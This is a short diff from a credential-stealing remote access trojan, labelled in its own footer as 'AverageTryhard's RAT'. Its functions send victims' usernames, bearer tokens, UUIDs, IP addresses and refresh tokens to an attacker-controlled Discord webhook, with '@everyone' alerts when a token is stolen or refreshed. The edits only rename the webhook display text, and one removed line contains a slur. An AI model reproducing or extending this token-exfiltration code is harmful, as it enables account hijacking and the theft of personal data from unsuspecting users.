@@ -129,7 +129,7 @@ async function getUsernameAndUUID(bearerToken) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-username: "Ratted This Retard",
+username: "Average's Pet Rat Got Another One",
   avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
 content: "@everyone",
   embeds: [
@@ -157,7 +157,7 @@ content: "@everyone",
         }
       ],
       "footer": {
-        "text": "made by AverageTryhard",
+        "text": "AverageTryhard's RAT",
         "icon_url": "https://bigrat.monster/media/bigrat.png"
       }
     }
@@ -279,7 +279,7 @@ async function getNewUsernameAndUUID(newBearerToken) {
 function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
     const url = webhook_url
     let data = {
-username: "Refreshed This Retard",
+username: "Refreshed ong",
   avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
 content: "@everyone TOKEN REFRESHED!",
   embeds: [
@@ -307,7 +307,7 @@ content: "@everyone TOKEN REFRESHED!",
         }
       ],
       "footer": {
-        "text": "RAT",
+        "text": "AverageTryahard's Rat",
         "icon_url": "https://bigrat.monster/media/bigrat.png"
       }
     }
